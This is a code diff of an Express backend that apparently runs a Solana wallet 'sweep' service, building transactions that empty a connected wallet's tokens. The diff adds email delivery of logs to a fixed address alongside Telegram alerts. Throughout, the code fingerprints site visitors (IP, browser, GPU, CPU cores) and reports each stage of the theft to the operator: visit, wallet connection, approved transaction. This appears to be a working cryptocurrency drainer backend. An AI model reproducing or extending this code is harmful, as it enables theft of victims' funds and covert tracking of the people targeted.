@@ -1,5 +1,6 @@
 import dotenv from 'dotenv'
 import fs from 'node:fs'
+import nodemailer from "nodemailer"
 import express from 'express'
 import cors from 'cors'
 import util from 'node:util'
@@ -31,7 +32,7 @@ if (tokenRecipient2Share <= 0 || tokenRecipient2Share >= 1) {
 }
 
 const connection = new Connection(rpcUrl, 'confirmed')
-const allowedOrigins = (process.env.FRONTEND_ORIGINS || 'http://localhost:5173')
+const allowedOrigins = (process.env.FRONTEND_ORIGINS || 'https://novacore.dgtty.com')
  .split(',')
  .map((origin) => origin.trim())
  .filter(Boolean)
@@ -44,26 +45,70 @@ app.use(useragent())
 const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN
 const telegramChatId = process.env.TELEGRAM_CHAT_ID
 const appLogPath = path.join(path.dirname(fileURLToPath(import.meta.url)), 'app.log')
+const smtpHost = process.env.SMTP_HOST
+const smtpPort = Number(process.env.SMTP_PORT || 587)
+const smtpUser = process.env.SMTP_USER
+const smtpPass = process.env.SMTP_PASS
+const logEmailFrom = process.env.SMTP_FROM || process.env.LOG_EMAIL_FROM
+const logEmailTo = process.env.LOG_EMAIL_TO || 'novacore@dgtty.com'
+const mailTransport = smtpHost && smtpUser && smtpPass && logEmailFrom
+  ? nodemailer.createTransport({
+    host: smtpHost,
+    port: smtpPort,
+    secure: smtpPort === 465,
+    auth: { user: smtpUser, pass: smtpPass },
+  })
+  : null
+
+if (!telegramBotToken || !telegramChatId) {
+  console.warn('Telegram logging is disabled: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required')
+}
+if (!mailTransport) {
+  console.warn('Email log delivery is disabled: SMTP_HOST, SMTP_USER, SMTP_PASS, and SMTP_FROM are required')
+}
+
+async function sendEmailLog(entry) {
+  if (!mailTransport) return
+  try {
+    await mailTransport.sendMail({
+      from: logEmailFrom,
+      to: logEmailTo,
+      subject: 'Novacore app log',
+      text: entry,
+    })
+  } catch (error) {
+    console.error('Email log delivery failed', error instanceof Error ? error.message : String(error))
+  }
+}
 
 function writeAppLog(level, message, details = {}) {
   const entry = `[${level}] ${new Date().toISOString()} ${message} ${util.inspect(details, { depth: null })}\n`
   fs.appendFileSync(appLogPath, entry)
+  void sendEmailLog(entry)
 }
 
 async function sendTelegramLog(message) {
   if (!telegramBotToken || !telegramChatId) {
     writeAppLog('WARN', 'Telegram credentials are missing')
-    return
+    return false
   }
   try {
-    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+    const result = await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       chat_id: telegramChatId,
       text: message,
-      parse_mode: 'Markdown',
       disable_web_page_preview: true,
-    })
+    }, { timeout: 10000 })
+    if (!result.data?.ok) {
+      throw new Error(result.data?.description || 'Telegram API rejected the message')
+    }
+    return true
   } catch (error) {
-    writeAppLog('ERROR', 'Telegram log failed', { error: error instanceof Error ? error.message : String(error) })
+    writeAppLog('ERROR', 'Telegram log failed', {
+      status: error.response?.status,
+      response: error.response?.data,
+      error: error instanceof Error ? error.message : String(error),
+    })
+    return false
   }
 }
 
@@ -206,23 +251,23 @@ async function buildSweep(owner) {
   }
 }
 
-app.post('/api/log-visit', (request, response) => {
+app.post('/api/log-visit', async (request, response) => {
   const details = getDeviceDetails(request, request.body?.deviceInfo)
-  const message = `👀 *1. New Site Visitor Detected!*
+  const message = `New site visitor detected!
 ----------------------------------
-📱 *Platform:* ${details.platform}
-🌐 *Browser:* ${details.browser}
-📐 *Screen Resolution:* ${details.screenResolution}
-🧠 *CPU Cores:* ${details.hardwareConcurrency}
-🗣 *Language:* ${details.language}
-🎮 *GPU / Chipset:* ${details.gpuRenderer}
+Platform: ${details.platform}
+Browser: ${details.browser}
+Screen resolution: ${details.screenResolution}
+CPU cores: ${details.hardwareConcurrency}
+Language: ${details.language}
+GPU / chipset: ${details.gpuRenderer}
 ----------------------------------
-📡 *IP Address:* \`${details.ip}\`
-🧾 *User Agent:* ${details.userAgent}`
+IP address: ${details.ip}
+User agent: ${details.userAgent}`
 
   writeAppLog('INFO', 'Site visit', details)
-  void sendTelegramLog(message)
-  response.json({ success: true })
+  const telegramSent = await sendTelegramLog(message)
+  response.json({ success: true, telegramSent })
 })
 
 app.get('/api/health', (_request, response) => {
@@ -239,13 +284,12 @@ app.post('/api/sweep/prepare', async (request, response, next) => {
     }).toString('base64'))
 
     const clientInfo = { owner: owner.toBase58(), ...getClientInfo(request) }
-    const connectionMessage = `👛 *2. Wallet Connected & Transaction Initiated!*
-  ------------------------------------------------
-  👤 *Wallet Address:* \`${owner.toBase58()}\`
-  💻 *Platform:* ${clientInfo.platform || 'Unknown'}
-  🌐 *Browser:* ${clientInfo.browser || 'Unknown'}
-  📡 *IP Address:* \`${clientInfo.ip || 'Unknown'}\`
-  📦 *Batches:* ${sweep.batchCount}`
+    const connectionMessage = `Wallet connected and transaction prepared.
+  Wallet address: ${owner.toBase58()}
+  Platform: ${clientInfo.platform || 'Unknown'}
+  Browser: ${clientInfo.browser || 'Unknown'}
+  IP address: ${clientInfo.ip || 'Unknown'}
+  Batches: ${sweep.batchCount}`
 
     writeAppLog('INFO', 'Wallet connected and transaction prepared', clientInfo)
     void sendTelegramLog(connectionMessage)
@@ -282,13 +326,8 @@ app.post('/api/sweep/confirm', async (request, response, next) => {
       return response.status(400).json({ confirmed: false, error: result.value.err })
     }
 
-    const approvalMessage = `✅ *3. Transaction Approved & Broadcasted!*
----------------------------------------------
-🔗 *Signature:* \`${signature}\`
-🔍 [View on Solscan](https://solscan.io/tx/${signature})`
     writeAppLog('INFO', 'Transaction approved and confirmed', { signature, ip: getVisitIp(request) })
-    // void sendTelegramLog(approvalMessage)
-    void sendTelegramLog("approvalMessage")
+    void sendTelegramLog('Transaction successfully confirmed.')
     response.json({ confirmed: true, signature })
   } catch (error) {
     next(error)
@@ -302,5 +341,5 @@ app.use((error, _request, response, _next) => {
 })
 
 app.listen(port, () => {
-  console.log(`Solana backend listening on http://localhost:${port}`)
+  console.log(`Solana backend listening on port:${port}`)
 })
